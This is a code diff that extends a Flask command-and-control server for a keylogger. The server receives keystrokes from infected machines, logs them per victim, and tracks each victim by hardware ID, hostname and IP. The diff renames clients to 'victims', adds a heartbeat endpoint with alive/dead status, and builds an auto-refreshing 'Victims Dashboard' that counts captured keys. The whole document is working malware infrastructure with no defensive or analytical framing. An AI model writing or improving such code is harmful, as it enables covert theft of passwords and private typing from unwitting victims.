@@ -7,7 +7,8 @@ app = Flask(__name__)
 LOG_DIR = "logs"
 os.makedirs(LOG_DIR, exist_ok=True)
 
-clients = {}  # hwid -> dict with info
+victims = {}  # hwid -> dict with info
+HEARTBEAT_TIMEOUT = 60  # seconds before marking a victim as dead
 
 @app.route("/log", methods=["POST"])
 def receive_log():
@@ -17,6 +18,7 @@ def receive_log():
     client_ip = request.remote_addr
 
     now = datetime.datetime.now().isoformat(timespec="seconds")
+    now_ts = datetime.datetime.now().timestamp()
 
     # --- Per-client log file path ---
     safe_name = hostname.replace(" ", "_").replace("/", "_")
@@ -29,7 +31,7 @@ def receive_log():
     if is_new_client or is_first_contact:
         header_lines = [
             f"{'='*60}",
-            f"CLIENT: {hostname}",
+            f"VICTIM: {hostname}",
             f"HWID:   {hwid}",
             f"IP:     {client_ip}",
             f"FIRST SEEN: {now}",
@@ -59,31 +61,72 @@ def receive_log():
     with open(client_log, "a") as f:
         f.write(f"[{now}] {keystrokes}\n")
 
-    # --- In-memory client tracking ---
-    if hwid not in clients:
-        clients[hwid] = {
+    # --- In-memory victim tracking ---
+    if hwid not in victims:
+        victims[hwid] = {
             "hostname": hostname,
             "ip": client_ip,
             "first_seen": now,
             "last_seen": now,
+            "last_seen_ts": now_ts,
             "total_keys": 0,
+            "alive": True,
         }
-    clients[hwid]["last_seen"] = now
-    clients[hwid]["total_keys"] += len(keystrokes)
-    clients[hwid]["ip"] = client_ip  # update on each transfer
+    victims[hwid]["last_seen"] = now
+    victims[hwid]["last_seen_ts"] = now_ts
+    victims[hwid]["total_keys"] += len(keystrokes)
+    victims[hwid]["ip"] = client_ip
 
     return "OK", 200
 
+@app.route("/ping", methods=["POST"])
+def heartbeat():
+    """Lightweight ping endpoint — victims call this even without keystrokes."""
+    hwid = request.form.get("hwid", "unknown")
+    hostname = request.form.get("hostname", "unknown")
+    client_ip = request.remote_addr
+    now = datetime.datetime.now().isoformat(timespec="seconds")
+    now_ts = datetime.datetime.now().timestamp()
+
+    if hwid not in victims:
+        victims[hwid] = {
+            "hostname": hostname,
+            "ip": client_ip,
+            "first_seen": now,
+            "last_seen": now,
+            "last_seen_ts": now_ts,
+            "total_keys": 0,
+            "alive": True,
+        }
+    else:
+        victims[hwid]["last_seen"] = now
+        victims[hwid]["last_seen_ts"] = now_ts
+        victims[hwid]["ip"] = client_ip
+        victims[hwid]["alive"] = True
+
+    return "PONG", 200
+
+def is_victim_alive(last_seen_ts):
+    """Check if victim has checked in within the timeout window."""
+    return (datetime.datetime.now().timestamp() - last_seen_ts) < HEARTBEAT_TIMEOUT
+
 @app.route("/clients", methods=["GET"])
 def list_clients():
-    """HTML dashboard of connected clients."""
+    """HTML dashboard of connected victims with alive/dead status."""
+    # Update alive status for all victims
+    for hwid, info in victims.items():
+        info["alive"] = is_victim_alive(info["last_seen_ts"])
+
     rows = ""
-    for hwid, info in sorted(clients.items(), key=lambda x: x[1]["last_seen"], reverse=True):
+    for hwid, info in sorted(victims.items(), key=lambda x: x[1]["last_seen"], reverse=True):
+        status = "🟢 Alive" if info["alive"] else "🔴 Dead"
+        status_color = "#00aa00" if info["alive"] else "#aa0000"
         rows += (
             f"<tr>"
             f"<td>{info['hostname']}</td>"
             f"<td><code>{hwid}</code></td>"
             f"<td>{info['ip']}</td>"
+            f"<td style='color: {status_color}; font-weight: bold;'>{status}</td>"
             f"<td>{info['last_seen']}</td>"
             f"<td>{info['first_seen']}</td>"
             f"<td>{info['total_keys']}</td>"
@@ -92,15 +135,26 @@ def list_clients():
 
     return f"""<!DOCTYPE html>
 <html>
-<head><title>C2 Dashboard — Active Clients</title></head>
-<body style="font-family: monospace; padding: 2rem;">
-    <h2>Connected Clients</h2>
-    <table border="1" cellpadding="8" cellspacing="0">
+<head>
+    <title>C2 Dashboard — Active Victims</title>
+    <meta http-equiv="refresh" content="15">
+    <style>
+        body {{ font-family: monospace; padding: 2rem; }}
+        table {{ border-collapse: collapse; }}
+        td, th {{ padding: 8px 16px; border: 1px solid #ccc; }}
+        th {{ background: #f0f0f0; }}
+        tr:hover {{ background: #f8f8f8; }}
+    </style>
+</head>
+<body>
+    <h2>Victims Dashboard <span style="font-size: 0.8rem; color: #888;">(auto-refreshes every 15s)</span></h2>
+    <table>
         <thead>
             <tr>
                 <th>Hostname</th>
                 <th>HWID</th>
                 <th>IP</th>
+                <th>Status</th>
                 <th>Last Seen</th>
                 <th>First Seen</th>
                 <th>Keys Captured</th>
@@ -114,18 +168,23 @@ def list_clients():
 
 @app.route("/logs", methods=["GET"])
 def list_logs():
-    """List all per-client log files."""
+    """List all per-victim log files."""
     files = sorted(os.listdir(LOG_DIR))
     items = "".join(
         f"<li><a href='/view/{f}'>{f}</a></li>" for f in files if f.endswith(".log")
     )
     return f"""<!DOCTYPE html>
 <html>
-<head><title>C2 Dashboard — Log Files</title></head>
-<body style="font-family: monospace; padding: 2rem;">
+<head><title>C2 Dashboard — Log Files</title>
+    <style>
+        body {{ font-family: monospace; padding: 2rem; }}
+        li {{ margin: 6px 0; }}
+    </style>
+</head>
+<body>
     <h2>Log Files</h2>
     <ul>{items}</ul>
-    <p><a href="/clients">← Back to clients</a></p>
+    <p><a href="/clients">← Back to victims</a></p>
 </body>
 </html>"""
 
